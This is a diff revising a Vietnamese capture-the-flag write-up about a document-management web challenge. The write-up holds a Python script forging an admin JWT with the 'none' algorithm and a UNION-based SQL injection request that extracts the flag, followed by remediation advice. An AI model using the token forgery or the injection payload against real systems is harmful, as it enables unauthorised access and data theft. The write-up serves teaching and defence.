@@ -15,7 +15,7 @@ showTableOfContents: true
 
 ---
 
-## 1. Phân tích đề bài & Trinh sát (Reconnaissance)
+## 1. Phân tích đề bài & Trinh sát
 
 Bài thi cung cấp một ứng dụng web quản lý tài liệu nội bộ với chức năng đăng nhập, đăng ký và khu vực `Admin Panel` chỉ dành cho tài khoản có role `admin`.
 
@@ -40,7 +40,7 @@ Token có dạng 3 phần base64:
 
 ---
 
-## 2. Tìm kiếm lỗ hổng (Vulnerability Discovery)
+## 2. Tìm kiếm lỗ hổng
 
 ### Lỗ hổng 1: JWT Signature Verification Bypass (`alg: "none"`)
 Kiểm tra backend xử lý token: server sử dụng thư viện cũ và cho phép chấp nhận thuật toán `none` mà không ép buộc secret key khi verify.
@@ -61,7 +61,7 @@ Rõ ràng backend ghép chuỗi trực tiếp vào truy vấn SQLite!
 
 ---
 
-## 3. Quá trình khai thác (Exploitation)
+## 3. Khai thác lỗ hổng
 
 ### Bước 1: Giả mạo token Admin bằng Python
 Ta tạo script forge JWT với `alg: "none"` và `role: "admin"`:
@@ -69,35 +69,37 @@ Ta tạo script forge JWT với `alg: "none"` và `role: "admin"`:
 ```python
 import base64
 import json
+import requests
 
-def b64url(data):
-    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')
-
+# Payload admin
 header = {"alg": "none", "typ": "JWT"}
-payload = {"sub": "admin", "role": "admin", "exp": 1999999999}
+payload = {"sub": "guest", "role": "admin", "exp": 1773588000}
 
-jwt_forged = f"{b64url(json.dumps(header).encode())}.{b64url(json.dumps(payload).encode())}."
-print(f"[+] Admin JWT: {jwt_forged}")
+def b64_encode(data):
+    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")
+
+forged_jwt = f"{b64_encode(header)}.{b64_encode(payload)}."
+print(f"[+] Forged JWT: {forged_jwt}")
 ```
 
 ### Bước 2: Khai thác SQL Injection UNION SELECT để trích xuất Flag
-Sử dụng token vừa tạo, gửi payload UNION-based SQLi:
+Sử dụng token vừa tạo, gửi request khai thác UNION-based SQLi để đọc bảng `flags`:
 
 ```http
-GET /api/v1/vault?search=' UNION SELECT 1, flag, 3 FROM secrets-- - HTTP/1.1
+GET /api/v1/vault?search=' UNION SELECT 1, flag, 'admin' FROM flags-- HTTP/1.1
 Host: target.svattt.ctf
-Authorization: Bearer eyJhbGciOiAibm9uZSI...
+Authorization: Bearer eyJhbGciOiAibm9uZ...
 ```
 
-**Response trả về:**
+**Response**:
 ```json
 {
   "status": "success",
-  "data": [
+  "results": [
     {
       "id": 1,
       "title": "SVATTT{jwt_n0n3_4lg_c0mb1n3d_w1th_sql1_77a9b2}",
-      "author": "3"
+      "author": "admin"
     }
   ]
 }
@@ -107,7 +109,7 @@ Authorization: Bearer eyJhbGciOiAibm9uZSI...
 
 ---
 
-## 4. Biện pháp khắc phục (Remediation)
+## 4. Biện pháp khắc phục
 
 1. **Về JWT**:
    - Khóa chặt danh sách thuật toán hợp lệ trên server (`algorithms=['HS256']`). Tuyệt đối cấm thuật toán `none`.
